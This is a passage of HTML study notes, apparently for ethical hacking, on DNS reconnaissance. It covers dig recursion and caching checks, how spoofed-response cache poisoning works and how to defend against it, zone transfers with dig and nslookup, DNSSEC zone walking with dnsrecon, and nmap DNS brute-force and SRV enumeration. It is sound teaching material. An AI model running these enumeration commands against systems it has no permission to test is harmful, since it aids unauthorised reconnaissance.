integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4614cfe1-531a-40b0-8f37-b8cf4816221d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">dig @192.0.2.53 www.google.com</code></pre></li></ul></li></ol><ol type="1" id="c8811092-e6f7-4b23-beee-95a9904652ad" class="numbered-list" start="2"><li><strong>Check the Response</strong>:<ul id="c8e0debf-19d0-4fab-9ad6-19d5c7b5b0e8" class="bulleted-list"><li style="list-style-type:disc">If the response contains an IP address for <code>www.google.com</code>, the DNS server performed a recursive query to resolve the address.</li></ul></li></ol><h3 id="74ca1116-4deb-436e-ae84-055628fe032a" class="">Example Output:</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="956e340b-584c-4533-80db-8042eebaa725" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; @192.0.2.53 www.google.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 54321
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; QUESTION SECTION:
;www.google.com.               IN      A

;; ANSWER SECTION:
www.google.com.        300     IN      A       142.250.64.68

;; Query time: 40 msec
;; SERVER: 192.0.2.53#53(192.0.2.53)
;; WHEN: Wed Jun 26 12:34:56 UTC 2024
;; MSG SIZE  rcvd: 58</code></pre><ul id="c08683dc-f4f3-408c-8cee-cf6b77f2d6e4" class="bulleted-list"><li style="list-style-type:disc"><strong>Key Indicators</strong>:<ul id="886dc66e-93e3-4ac3-b9fa-d71c77294bef" class="bulleted-list"><li style="list-style-type:circle">The presence of <code>ra</code> (Recursion Available) flag in the response indicates that the server supports recursive queries.</li></ul></li></ul></details></li></ul><ul id="6e6bf38d-3b7c-4fa2-a4eb-474129436501" class="toggle"><li><details open=""><summary>Identifying DNS Caching Capability</summary><p id="87dd5f49-4b4e-4e87-9909-16543287b739" class="">To check if a DNS server caches responses, an ethical hacker can send the same query multiple times and measure the response time. A significant decrease in response time on subsequent queries suggests caching.</p><h3 id="36238423-65eb-4833-bf1b-e326769932f8" class="">Steps:</h3><ol type="1" id="7820a651-c950-4405-9d86-b76a7b62c5b2" class="numbered-list" start="1"><li><strong>Initial Query</strong>:<ul id="5ff12c09-85cd-439d-a4b0-e1a23cdc5f00" class="bulleted-list"><li style="list-style-type:disc">Send a query to the DNS server for a specific domain.</li></ul><ul id="0decf8d9-2203-4fe1-90d5-2452dadcedef" class="bulleted-list"><li style="list-style-type:disc">Example:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f108622c-4128-4c1c-9ba5-b9462995b1ac" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">shCopy code
dig @192.0.2.53 www.example.com

</code></pre></li></ul></li></ol><ol type="1" id="6277a124-3d1f-4422-9fd5-6e0ea474c6c6" class="numbered-list" start="2"><li><strong>Measure Response Time</strong>:<ul id="ee67dd22-2322-465d-8b73-1ec794bc2ea1" class="bulleted-list"><li style="list-style-type:disc">Note the response time.</li></ul></li></ol><ol type="1" id="30f744c5-329b-462a-90f0-4d2a28507ca1" class="numbered-list" start="3"><li><strong>Repeat the Query</strong>:<ul id="156f1036-a4fb-4a47-a53a-c2c35f8e6db8" class="bulleted-list"><li style="list-style-type:disc">Send the same query again after a short interval.</li></ul><ul id="12d7edb4-978b-4325-8a7c-d4650ca11358" class="bulleted-list"><li style="list-style-type:disc">Example:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="77016aef-15a1-4236-b183-91568e481349" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">shCopy code
dig @192.0.2.53 www.example.com

</code></pre></li></ul></li></ol><ol type="1" id="5ac263c9-3e4b-4a47-b7d8-6a58fefdcfa6" class="numbered-list" start="4"><li><strong>Analyze the Response</strong>:<ul id="d55ebc24-e543-4bb0-aa04-e2f962a82833" class="bulleted-list"><li style="list-style-type:disc">Compare the response times. A significantly faster response on subsequent queries indicates that the result was served from the cache.</li></ul></li></ol></details></li></ul><ul id="9392e0e7-106a-4481-9c7f-db637efe52c5" class="toggle"><li><details open=""><summary>Why the Server Accepts Spoofed Responses</summary><ol type="1" id="d16c7c0e-8074-4b7e-98d0-b0a05817a26e" class="numbered-list" start="1"><li><strong>Lack of Response Validation</strong>:<ul id="427666e9-d1df-46a7-849f-9c0db2c0c980" class="bulleted-list"><li style="list-style-type:disc">Traditional DNS does not validate responses, making it susceptible to accepting forged responses if they appear legitimate.</li></ul><ul id="49553cf5-1979-43ad-817b-bd4db1efe8fa" class="bulleted-list"><li style="list-style-type:disc">DNS responses include a transaction ID, which is used to match responses with corresponding queries.</li></ul></li></ol><ol type="1" id="3607f075-4395-479e-91a8-6fb047ab0f16" class="numbered-list" start="2"><li><strong>Matching Transaction ID and Source Port</strong>:<ul id="357041d2-3925-4781-809e-99bb9870ff2f" class="bulleted-list"><li style="list-style-type:disc">For a DNS resolver to accept a response, the transaction ID and source port in the response must match the ones used in the query.</li></ul><ul id="89ef6870-1a58-4b78-8181-bd2ffe88ece5" class="bulleted-list"><li style="list-style-type:disc">Attackers exploit this by flooding the resolver with spoofed responses, each containing different transaction IDs and source ports, increasing the chance of a match.</li></ul></li></ol><ol type="1" id="9d00c940-2627-46d8-8c24-f4b593a627e5" class="numbered-list" start="3"><li><strong>Race Condition</strong>:<ul id="90f9add5-4f16-44c4-9d46-0b2b0c8a4abe" class="bulleted-list"><li style="list-style-type:disc">Attackers must send spoofed responses before the legitimate response arrives.</li></ul><ul id="43f82a53-e8c7-42f7-aa65-e59b902776ec" class="bulleted-list"><li style="list-style-type:disc">By sending numerous forged responses with different transaction IDs, attackers increase their chances of success.</li></ul></li></ol></details></li></ul><ul id="f1442490-7ef7-483e-9737-9d27c62a359e" class="toggle"><li><details open=""><summary>How to Prevent DNS Cache Poisoning</summary><ol type="1" id="e359b50f-04de-4f7a-952e-22885dcc2471" class="numbered-list" start="1"><li><strong>Implement DNSSEC</strong>:<ul id="69c439cd-365c-4031-bfdf-18c52a61fcdd" class="bulleted-list"><li style="list-style-type:disc">DNSSEC adds digital signatures to DNS responses, allowing resolvers to verify the authenticity of the data.</li></ul><ul id="448ed225-57d7-433d-8a17-eb56e5e8d621" class="bulleted-list"><li style="list-style-type:disc">Even if an attacker can guess the transaction ID, without the correct signature, the response will be rejected.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="60797180-78c2-4ddd-a35b-1f154c806a51" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">plaintextCopy code
options {
    directory &quot;/var/named&quot;;
    allow-query { any; };
    recursion yes;
    dnssec-enable yes;
    dnssec-validation yes;
};

</code></pre></li></ol><ol type="1" id="30b00981-d3bb-4e51-89b5-d4fae6fc0423" class="numbered-list" start="2"><li><strong>Randomize Source Ports and Transaction IDs</strong>:<ul id="cbf6fb65-a479-4730-a15f-9f90c977fa83" class="bulleted-list"><li style="list-style-type:disc">Use a large pool of source ports and random transaction IDs to make guessing harder for attackers.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c2ee7b78-6d0a-4917-9f07-8b4db1c431ff" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">plaintextCopy code
options {
    query-source address * port 0;
};

</code></pre></li></ol><ol type="1" id="43ee69b9-b3ca-419e-aa5a-4ea10ed5db19" class="numbered-list" start="3"><li><strong>Restrict Recursion</strong>:<ul id="e421acaf-8391-4071-aba8-3addef7bb7fb" class="bulleted-list"><li style="list-style-type:disc">Limit recursive query capabilities to trusted clients only.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c0588805-4c19-49fc-9649-d6749130711b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">plaintextCopy code
options {
    allow-recursion { 192.168.0.0/24; };
};

</code></pre></li></ol><ol type="1" id="bfb69a0b-ba89-4cf8-b6fb-3afcabd3e640" class="numbered-list" start="4"><li><strong>Regular Software Updates</strong>:<ul id="f0735366-b08e-4a6a-8250-550b131cfe47" class="bulleted-list"><li style="list-style-type:disc">Ensure DNS software is up-to-date with the latest security patches.</li></ul></li></ol></details></li></ul></details></li></ul><ul id="1fa7f2a2-588c-4eb1-825f-80603d4d77ed" class="toggle"><li><details open=""><summary>General Security Practices</summary><ol type="1" id="244c2ce2-65ae-4bb7-a6ff-a62f3f0b31ae" class="numbered-list" start="1"><li><strong>Enable DNSSEC</strong>:<ul id="2097f830-c0a9-4e2d-be03-e9cc20ec138c" class="bulleted-list"><li style="list-style-type:disc">Implement DNSSEC on both authoritative and recursive DNS servers to ensure all DNS responses are signed and can be verified.</li></ul></li></ol><ol type="1" id="d53b7077-7558-40c1-931e-c0e6bfd9c228" class="numbered-list" start="2"><li><strong>Randomize Source Ports and Transaction IDs</strong>:<ul id="1e661c4d-fd73-4206-8ab7-3e5da9fffebc" class="bulleted-list"><li style="list-style-type:disc">Use a large pool of source ports and random transaction IDs to make it harder for attackers to guess and spoof responses.</li></ul></li></ol><ol type="1" id="de3caffe-947f-445a-a980-b676fed196c4" class="numbered-list" start="3"><li><strong>Restrict Recursion</strong>:<ul id="e19bca2b-de0c-45b2-8c3c-bf41a6a52be2" class="bulleted-list"><li style="list-style-type:disc">Limit recursive queries to trusted clients to reduce the attack surface.</li></ul></li></ol><ol type="1" id="735c5721-7caf-49c7-bf9e-c11754122e09" class="numbered-list" start="4"><li><strong>Monitor and Rate Limit</strong>:<ul id="637063de-ae61-42ad-9683-7f3947ffc669" class="bulleted-list"><li style="list-style-type:disc">Monitor DNS traffic for unusual patterns and implement rate limiting to mitigate the risk of cache poisoning attempts.</li></ul></li></ol></details></li></ul><p id="a37d50fa-0c44-4357-8dae-bb21504a17c1" class="">Techniques:<div class="indented"><ul id="164eacfa-48be-48f2-a9cd-12cce0bf7ef2" class="toggle"><li><details open=""><summary>Zone transfer</summary><p id="29f2ca55-0d8b-4906-b957-62b3e2088e86" class="">DNS Zone Transfers are mechanisms used to replicate DNS database information across multiple DNS servers. </p><p id="ae1d33c1-8263-4fa4-aec5-96c372d7d667" class="">The primary goal is to ensure consistency and redundancy of DNS data across a network. </p><p id="64fbe5a3-3de8-488c-b2a1-230320194615" class="">Zone transfers allow secondary (slave) DNS servers to keep their DNS data synchronized with the primary (master) DNS server.</p><ul id="fcf93a6c-87e1-4ffe-b5c7-d283965d339a" class="toggle"><li><details open=""><summary>Types of DNS Zone Transfers</summary><ol type="1" id="f420422c-a4a2-4062-8544-e885eb8bcfb7" class="numbered-list" start="1"><li><strong>AXFR (Full Zone Transfer)</strong>:<ul id="cd9d7445-d2a9-450c-a68b-6a5abf75f1e1" class="bulleted-list"><li style="list-style-type:disc">Transfers the entire zone file from the master DNS server to the secondary DNS server.</li></ul><ul id="901e6342-90e2-4f49-ae65-0574426e407b" class="bulleted-list"><li style="list-style-type:disc">Typically used when a new secondary server is set up or if significant changes have been made to the zone data.</li></ul></li></ol><ol type="1" id="fe41da2c-9464-4e4e-ba2d-946e41015efb" class="numbered-list" start="2"><li><strong>IXFR (Incremental Zone Transfer)</strong>:<ul id="d563774a-0f6f-4461-a247-f450ec4d4a8f" class="bulleted-list"><li style="list-style-type:disc">Transfers only the changes (deltas) since the last update rather than the entire zone file.</li></ul><ul id="a6ebe8b6-f028-4231-b9af-9e8ec31a12b1" class="bulleted-list"><li style="list-style-type:disc">More efficient than AXFR for regular updates because it reduces the amount of data transferred.</li></ul></li></ol></details></li></ul><ul id="5969ce02-f37f-4e7e-a80b-f7f006737ae6" class="toggle"><li><details open=""><summary>Potential Vulnerabilities</summary><ol type="1" id="ba9fb12a-210e-4e9d-95e2-21bc42f850dc" class="numbered-list" start="1"><li><strong>Unauthorized Zone Transfers</strong>:<ul id="5cb7955e-4967-42a0-a382-aaf053c9d853" class="bulleted-list"><li style="list-style-type:disc">If not properly restricted, attackers can perform unauthorized zone transfers to obtain sensitive DNS data, which can aid in reconnaissance and planning attacks.</li></ul></li></ol><ol type="1" id="96f633b7-7d8b-47be-9e0d-15f314befdf8" class="numbered-list" start="2"><li><strong>Denial of Service (DoS)</strong>:<ul id="2c6979df-c8ac-4e38-87d1-0e7f04f66893" class="bulleted-list"><li style="list-style-type:disc">Attackers can abuse the zone transfer mechanism to overload the DNS server with requests, potentially causing a denial of service.</li></ul></li></ol><ol type="1" id="f1219312-e6c0-4a15-bcdc-662e03272291" class="numbered-list" start="3"><li><strong>Data Integrity</strong>:<ul id="7a8b89e8-c5e0-4261-b80e-9294b40d464e" class="bulleted-list"><li style="list-style-type:disc">Without proper authentication (e.g., TSIG), there is a risk of data tampering during transfer.</li></ul></li></ol></details></li></ul></details></li></ul><ul id="2b1be467-958c-4be4-a99d-0e61452579c2" class="bulleted-list"><li style="list-style-type:disc">DNS cache snooping</li></ul><ul id="ca3df7b2-bbea-4753-be68-3b3263f9575f" class="bulleted-list"><li style="list-style-type:disc">DNSSEC zone walking</li></ul></div></p><p id="4e38d5c5-4036-4758-9bab-63e88a086bc1" class="">
</p><ul id="0b2f3f89-5712-4e2d-960d-130c12638869" class="toggle"><li><details open=""><summary>Zone Transfer</summary><p id="560acaa0-64b4-4da0-8466-e1b45570eaf9" class="">DNS zone transfer is the process of transferring a copy of the DNS zone file from the primary DNS server to a secondary DNS server.</p><p id="d95acf31-72f3-4bcd-84e2-8614373e0666" class="">In most cases, the DNS server maintains a spare or secondary server for redundancy, which holds all information stored in the main server.</p><p id="94a79d8a-f20e-4edc-aa48-b94db126628c" class="">If the DNS transfer setting is enabled on the target DNS server, it will give all the records in the DNS</p><p id="65f78e42-cb44-43f5-b2e5-a856680c639e" class="">There is access control for zone transfers which can be configured by admins</p><p id="7920f564-cf66-4090-9673-6f3a24de7113" class="">
</p><ul id="4acf9de7-1052-4504-b660-9445117f1b60" class="toggle"><li><details open=""><summary>Using DIG</summary><ol type="1" id="aff28a9a-61ac-4df7-8404-df96e7f1ce8b" class="numbered-list" start="1"><li>Find available name servers <p id="ee628a43-3638-4e19-bde9-5019491eb631" class="">These are the DNS that have the original NS records of this domain </p><ul id="0cd1de4a-d933-439f-a9b8-b02cfcec1970" class="bulleted-list"><li style="list-style-type:disc"><code>dig ns &lt;target domain&gt;</code><ul id="fbfd9a20-6964-4da7-8505-7b3cd5a304e7" class="bulleted-list"><li style="list-style-type:circle"><code>ns</code> returns the name servers</li></ul><ul id="012d94a1-0823-459e-aee2-bf668ef0f3d5" class="bulleted-list"><li style="list-style-type:circle">name servers can be seen in the ANSWER SECTION at the rightmost side with NS tag</li></ul></li></ul></li></ol><ol type="1" id="573983c9-4c55-427f-98b2-35ae82be94d2" class="numbered-list" start="2"><li>See if one of those allows zone transfer<ul id="560c97b4-c611-4a50-aa8c-57b2cbccfa8a" class="bulleted-list"><li style="list-style-type:disc"><code>dig @&lt;name server&gt; &lt;target domain&gt; axfr</code><ul id="60609ae8-a273-446d-8f56-c712ccb16320" class="bulleted-list"><li style="list-style-type:circle"><code>axfr</code> retrieves zone information</li></ul><ul id="56a74774-c65b-4f85-8e8d-03e77c8fa3bc" class="bulleted-list"><li style="list-style-type:circle">If zone transfer is open and insecure, it will reveal all the info the DNS has</li></ul></li></ul></li></ol></details></li></ul><ul id="9a57c1ad-699e-4afc-8cc0-7c2ead971c29" class="toggle"><li><details open=""><summary>Using CMD</summary><ul id="ec90ff75-b50e-4c56-a53d-673bd6e31b08" class="bulleted-list"><li style="list-style-type:disc">Use nslookup interactive mode<ul id="6898bde0-3117-410a-812e-63aed94832e6" class="bulleted-list"><li style="list-style-type:circle">Type <code>nslookup</code> and press enter</li></ul></li></ul><ul id="a8a0a1ec-71d4-4696-933a-73a5d3ca6045" class="bulleted-list"><li style="list-style-type:disc">To retrieve only administrative info (start of authority)<ul id="b77e8ea2-25ad-4b23-a902-e8103d6efd3a" class="bulleted-list"><li style="list-style-type:circle"><code>set querytype=soa</code></li></ul><ul id="5578df4b-5598-4076-a6c8-0496ac9bda28" class="bulleted-list"><li style="list-style-type:circle">Type the ip or domain name to query for info</li></ul></li></ul><ul id="68aba7e2-856e-45dc-808b-fe5fb11aa756" class="bulleted-list"><li style="list-style-type:disc">Request zone transfer for a name server<ul id="9f1f0c6e-45ce-4926-8ebc-355c3ac4a086" class="bulleted-list"><li style="list-style-type:circle">Inside the <code>nslookup</code> interactive mode</li></ul><ul id="517eb78f-a7a2-430b-9049-4339d470cf56" class="bulleted-list"><li style="list-style-type:circle"><code>ls -d &lt;name server&gt;</code></li></ul></li></ul><ul id="ba4f866b-a3b8-4b12-82d3-9d1f87c2dd7d" class="bulleted-list"><li style="list-style-type:disc">If zone transfer is open and insecure, it will reveal all the info the DNS has</li></ul></details></li></ul><p id="1fda065b-9bf2-499f-aac3-c5e2a8c0e7ee" class="">
</p></details></li></ul><ul id="6cbbb2b9-f59a-4333-b4f7-5c00854ff9ca" class="toggle"><li><details open=""><summary>DNSSEC Zone Walking </summary><p id="7832b0b0-4a1d-4533-aea6-f13a5a3c36cc" class="">DNSSEC zone walking is a DNS enumeration technique that is used to obtain the internal records of the target DNS server</p><p id="6ee44ef0-e222-432e-9c2b-7b4becf5ec0d" class="">
</p><p id="15bbe860-23e3-4212-8c7a-1f8944d67f2e" class="">DNSRecon uses multiple techniques to gather records <div class="indented"><ul id="1a74ddee-7d16-4318-878a-6f22996674da" class="toggle"><li><details open=""><summary>Such as</summary><ul id="7d837f79-44a7-4aed-99af-5ce4194b35cb" class="bulleted-list"><li style="list-style-type:disc">Perform DNS lookups and reverse lookups.</li></ul><ul id="a473daa6-6253-44e0-8523-8bdbf49b4922" class="bulleted-list"><li style="list-style-type:disc">Brute force subdomains.</li></ul><ul id="366fd531-413b-4549-b4d7-492485caff55" class="bulleted-list"><li style="list-style-type:disc">Perform DNS zone transfers.</li></ul><ul id="1b17788d-3fd8-41ef-81d4-cf5568527fef" class="bulleted-list"><li style="list-style-type:disc">Enumerate DNS records using various techniques.</li></ul></details></li></ul></div></p><p id="04d45625-2440-4314-9ea7-105c66ab18e3" class="">Using the DNSRecon tool, the attacker can enumerate general DNS records for a given domain (MX, SOA, NS, A, AAAA, SPF, and TXT). </p><p id="930a9a10-1809-4d69-b9e6-8416c0f05916" class="">These DNS records contain digital signatures based on public-key cryptography to strengthen authentication in DNS.</p><ul id="f7d49822-4fb5-40f1-a12a-c233034b5fdf" class="toggle"><li><details open=""><summary>Understanding NSEC and NSEC3 Records</summary><h3 id="9ee9c375-e26b-4108-b750-5eebc4fed53e" class="">NSEC Records</h3><ul id="140d6b1b-c0f8-4a0a-aa4f-7fbf5336fbc1" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose</strong>: NSEC records are used in DNSSEC to provide authenticated denial of existence. They link one DNS name to the next DNS name in a zone file, forming a chain.</li></ul><ul id="f8acf9fd-3738-4953-ac8b-83d78726203b" class="bulleted-list"><li style="list-style-type:disc"><strong>Format</strong>: An NSEC record points to the next record in the zone and lists the record types available for the current name.</li></ul><ul id="df9de589-913f-44a1-94b7-90d532244664" class="bulleted-list"><li style="list-style-type:disc"><strong>Vulnerability</strong>: Because NSEC records list both the current and the next name in the zone, an attacker can use them to enumerate all the names in the zone by following the chain.</li></ul><h3 id="a9468786-9ff6-4dc4-b20f-290575e928f4" class="">NSEC3 Records</h3><ul id="50ac0257-e4cc-46e8-be59-e4fa601e4443" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose</strong>: NSEC3 records are similar to NSEC records but use cryptographic hashes of the DNS names to provide authenticated denial of existence.</li></ul><ul id="2c9bc4ed-66f9-4979-b158-a8a8e0070f2e" class="bulleted-list"><li style="list-style-type:disc"><strong>Format</strong>: An NSEC3 record links hashed names instead of plaintext names, making it harder (but not impossible) to enumerate the zone.</li></ul><ul id="9298a667-db88-41fa-ae6f-ad2d284b1a2d" class="bulleted-list"><li style="list-style-type:disc"><strong>Security</strong>: NSEC3 improves security by obfuscating the actual names, but with enough computational power and knowledge of the hashing algorithm, an attacker can still perform a zone walk.</li></ul></details></li></ul><p id="c33a11ad-7b3d-4e9b-99bf-4096fa2a4d5c" class="">
</p><ul id="b4d7ff76-bf03-4031-a777-92a2ca9c66d7" class="toggle"><li><details open=""><summary>Using DNSRecon</summary><ul id="d234f3f4-a7df-452d-bc40-6cf552a05c94" class="bulleted-list"><li style="list-style-type:disc"><code>dnsrecon.py -d &lt;target&gt; -z</code><ul id="4de4ef42-0a7c-4adb-a18a-28ebcc894d6e" class="bulleted-list"><li style="list-style-type:circle"><code>-d</code> specifies target</li></ul><ul id="2a5c649a-8986-482e-884a-87d435aa2273" class="bulleted-list"><li style="list-style-type:circle"><code>-z</code> performs DNSSEC zone walk</li></ul><ul id="57b1924f-00a3-4693-ad05-4b53a73acc41" class="bulleted-list"><li style="list-style-type:circle">Should try both with www and without</li></ul></li></ul></details></li></ul><p id="3a450933-a994-4a66-b124-862a43ad0274" class="">
</p><p id="8235bc0e-4322-4260-a5f1-7df85c840e30" class="">
</p></details></li></ul><ul id="e03fdf58-6285-44dd-8cdf-ac968a5f7377" class="toggle"><li><details open=""><summary>Using Nmap</summary><ul id="ee81b46e-2995-4511-9c24-d97d054db67e" class="bulleted-list"><li style="list-style-type:disc"><code><strong>nmap --script=broadcast-dns-service-discovery &lt;target&gt;</strong></code><ul id="d977066c-27d7-4494-904c-a056e1402db2" class="bulleted-list"><li style="list-style-type:circle">Used to identify available DNS servers on the local network</li></ul><ul id="d6eb05e0-ea94-40a0-b8cb-842fe5943f3a" class="bulleted-list"><li style="list-style-type:circle">it uses the DNS-SD (Service Discovery) to send multicast dns queries to the mDNS multicast address on port 5353</li></ul><ul id="a83bec9d-f2b1-4a77-8610-0b983a6d89f5" class="bulleted-list"><li style="list-style-type:circle">It listens for responses on the local network</li></ul><ul id="b8287356-fe13-4088-9064-56b404a7723a" class="bulleted-list"><li style="list-style-type:circle">Target seems to not be used at all on this scan but its necessary for some reason</li></ul></li></ul><ul id="ad0a85f5-aa48-4f9b-a9d1-b4137a8e2991" class="bulleted-list"><li style="list-style-type:disc"><code><strong>nmap -T4 -p 53 --script dns-brute &lt;target&gt;</strong></code><ul id="eb624a4b-de8c-4066-b233-e268f34faa73" class="bulleted-list"><li style="list-style-type:circle"><code>-T4</code> specifies the timing template <ul id="0219a270-9e0a-4dc8-af43-ce692e6917aa" class="bulleted-list"><li style="list-style-type:square">ranges from 0-5 where 0 is stealth and 5 is very fast</li></ul><ul id="55186c3b-45d9-4f3c-ae32-1890b8efcc13" class="bulleted-list"><li style="list-style-type:square">affects multiple parameters such as timeouts, parallelism, delay etc</li></ul></li></ul><ul id="df444282-b80b-4196-a093-5198c75d96dc" class="bulleted-list"><li style="list-style-type:circle"><code>dns-brute</code> bruteforces subdomains on dns server</li></ul><p id="097bb4bc-ad56-430e-9fe4-f0b6d6269464" class="">
</p></li></ul><ul id="8e22c0e4-cc0a-4745-8c7a-492628055842" class="bulleted-list"><li style="list-style-type:disc"><code><strong>nmap --script dns-srv-enum --script-args &quot;dns-srv-enum.domain=&#x27;&lt;target&gt;&#x27;”</strong></code><strong> </strong><ul id="61eba77f-3d13-4a91-804e-84d4fe27cbab" class="bulleted-list"><li style="list-style-type:circle"><code>dns-srv-enum</code> </li></ul><ul id="043c59fd-18be-48ec-9114-71abd857402f" class="bulleted-list"><li style="list-style-type:circle">used to find SRV records</li></ul><ul id="26878b50-9e86-4671-a6c4-3f3e52a24f7a" class="toggle"><li><details open=""><summary>What are SRV records?</summary><p id="927dee32-3ec9-4e3e-873f-5fd119c765bd" class="">SRV (Service) records are a type of DNS record used to define the location (hostname and port) of servers for specified services. They provide details about where a service can be accessed, including which protocol to use and the priority and weight of the servers.</p><p id="0a17fd6b-b00a-4559-9535-1fc673b7b146" class="">
</p><h3 id="01f5190a-d4ca-4aa1-a876-8f0a52ee3633" class="">Purpose</h3><p id="ce552c04-4a01-4665-a850-1b3131382d3d" class="">SRV records are designed to provide a standardized way of locating services. They specify:</p><ul id="bfdad668-cf78-49fd-b958-65110ec3a88f" class="bulleted-list"><li style="list-style-type:disc"><strong>Service</strong>: The specific service being offered.</li></ul><ul id="5e6e64ad-8f32-4bcd-9410-b3f1990dfaf2" class="bulleted-list"><li style="list-style-type:disc"><strong>Protocol</strong>: The transport protocol (e.g., TCP, UDP).</li></ul><ul id="d6b373b5-2ad8-4501-9b83-7a2c997c27fa" class="bulleted-list"><li style="list-style-type:disc"><strong>Priority</strong>: The priority of the target host (lower values indicate higher priority).</li></ul><ul id="2a92fbff-f9ee-48e0-9748-1fa3d2e840c3" class="bulleted-list"><li style="list-style-type:disc"><strong>Weight</strong>: The relative weight for records with the same priority (higher values indicate higher preference).</li></ul><ul id="9c1bb6ef-f347-4a39-86e9-55cc1969318c" class="bulleted-list"><li style="list-style-type:disc"><strong>Port</strong>: The port on which the service is running.</li></ul><ul id="0d321d64-917e-4579-8749-94df2109066e" class="bulleted-list"><li style="list-style-type:disc"><strong>Target</strong>: The hostname of the server providing the service.</li></ul><p id="aaf09e88-1616-4b89-90a2-e577c3f34a05" class="">
